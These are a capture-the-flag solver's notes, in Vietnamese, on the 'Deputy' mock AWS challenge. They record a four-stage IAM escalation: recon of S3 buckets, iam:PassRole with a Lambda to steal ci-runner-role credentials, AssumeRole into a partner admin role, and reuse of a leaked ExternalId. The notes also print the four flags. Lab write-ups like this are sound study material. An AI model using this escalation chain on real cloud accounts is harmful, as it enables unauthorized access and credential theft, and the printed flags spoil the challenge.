# notes.md — Deputy (cloud / AWS escalation walk)

## H0 — mock có enforce chữ ký không
target: `POST /` với header `Authorization` bịa tay
evidence: `Credential=AKIAANALYST0000000000/...` -> 200 GetCallerIdentity; không có header -> `403 InvalidClientTokenId`; key sai -> `InvalidAccessKeyId`
result: CONFIRMED — mock chỉ parse access key id từ header, **không verify signature**. Nên viết client tay bằng `requests`, không cần boto3 (boto3 cũng không có trên host).

## H1 — định vị route của từng service
evidence: `POST /?Action=...` trả `unsupported sts action X` cho action lạ -> dispatcher gộp ở `/`.
`GET /<segment>` -> `NoSuchBucket: <segment>` => S3 theo kiểu path-style, bucket = segment đầu.
`POST /iam` -> 405, `GET /iam` -> bucket "iam" => các path service không tồn tại, chỉ là S3 catch-all.
`GET /2015-03-31/functions` -> `{"Functions": []}` => Lambda dùng REST API thật.
result: CONFIRMED — 3 mặt API: STS+IAM (`POST /`), S3 (`GET /bucket[/key]`), Lambda REST (`/2015-03-31/functions...`)

## H2 — recon (flag 1)
did: `GET /` với key analyst -> ListAllMyBuckets: `deputy-analyst-scratch`, `deputy-runner-logs`, `deputy-flag-vault`, `deputy-crown-vault`
evidence: `GET /deputy-analyst-scratch` -> key `welcome.txt`; đọc được vì policy cho `s3:GetObject` đúng bucket đó
result: `H7CTF{d6cc592f5a2f3db80718}` + dòng onboarding "our deploys run through a Lambda that executes as ci-runner-role" chỉ thẳng stage 2

## H3 — passrole (flag 2)
target: analyst có `iam:PassRole` cho đúng `ci-runner-role`, và `lambda:CreateFunction` + `lambda:InvokeFunction` Resource `*`
did: `POST /2015-03-31/functions` body `{"FunctionName":"deputy-relay","Role":"arn:aws:iam::111111111111:role/ci-runner-role",...}` -> 201
    `POST /2015-03-31/functions/deputy-relay/invocations` -> 200 kèm `AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN` của role
result: CONFIRMED — GetCallerIdentity với creds đó trả `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-deputy-relay`
    -> đọc `s3://deputy-runner-logs/build.log` = `H7CTF{28f87391f8a228110839}`
ghi chú: đây là escalation kinh điển "PassRole vào service principal": quyền PassRole + CreateFunction = được chạy như role kia, dù bản thân analyst không assume được role đó.

## H4 — admin (flag 3)
target: inline policy của runner cho `sts:AssumeRole` tới `arn:aws:iam::999999999999:role/partner-admin-role` (account 999999999999)
did: AssumeRole bằng creds runner (không cần ExternalId, role này không đòi)
result: CONFIRMED — với creds admin: `GET /deputy-flag-vault` -> `flag` + `partner-config.json`
    flag 3 = `H7CTF{ea3e1dba8012d76e2648}`
    `partner-config.json` tiết lộ `secure_role = arn:aws:iam::999999999999:role/partner-secure-role` và `external_id = Dc-2026-8f31a97c4b2e`

## H5 — externalid (flag 4)
evidence: `GET /deputy-crown-vault` bằng creds partner-admin vẫn 403 `not authorized: s3:ListBucket`
did: AssumeRole `partner-secure-role`: không có ExternalId -> `403 The trust policy requires an sts:ExternalId but none was provided`; ExternalId sai -> `requires a matching sts:ExternalId`; dùng đúng `Dc-2026-8f31a97c4b2e` -> 200
result: CONFIRMED — `GET /deputy-crown-vault/flag` = `H7CTF{1dbe909840d15aabdd63}`
ý nghĩa: ExternalId ở đây chỉ là thứ *dữ liệu* nằm trong bucket mà stage trước mở ra; control chỉ chặn caller không có được nó. Chuỗi 4 stage khớp đúng tên 4 objective.

## Chướng ngại
- Lần probe đầu gửi `SessionName=s` -> `ValidationError: RoleSessionName must be at least 2 characters` (không phải lỗi auth).
- `iam:GetPolicyVersion` / `ListPolicies` trả rỗng (mock chỉ chứa **inline** policy): phải dùng `iam:GetUserPolicy` + `iam:GetRolePolicy` với tên policy lấy từ `ListUserPolicies` / `ListRolePolicies`.
- Các action "OK" nhưng thân rỗng kèm `xmlns` IAM là **fallback** của dispatcher, không phải dữ liệu thật (ví dụ `ListBuckets` qua POST). Data S3 thật chỉ về qua `GET /<bucket>`.
- Script chạy lại lần 2 gặp `409` ở CreateFunction (function đã tồn tại từ lần trước) — invoke vẫn dùng function cũ nên chuỗi không bị gãy. Trên instance mới sẽ là 201.
- Quên mất key thật `build.log` khi đoán tên object bằng danh sách tự nghĩ; bài học: luôn `GET /<bucket>` rồi đọc `<Key>` từ listing thay vì đoán.

## Chạy lại
`python solve_deputy.py` (in cả 4 stage, ghi `flags.txt`)
